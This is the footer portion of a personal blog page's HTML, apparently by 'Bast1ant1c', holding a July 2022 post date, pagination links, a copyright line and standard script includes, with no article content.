          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2022-07-25T00:00:00-05:00">July 25, 2022</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/osping/" class="pagination--pager" title="osping
">Previous</a>
    
    
      <a href="#" class="pagination--pager disabled">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    
<!--
    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
-->
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2022 Bast1ant1c</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
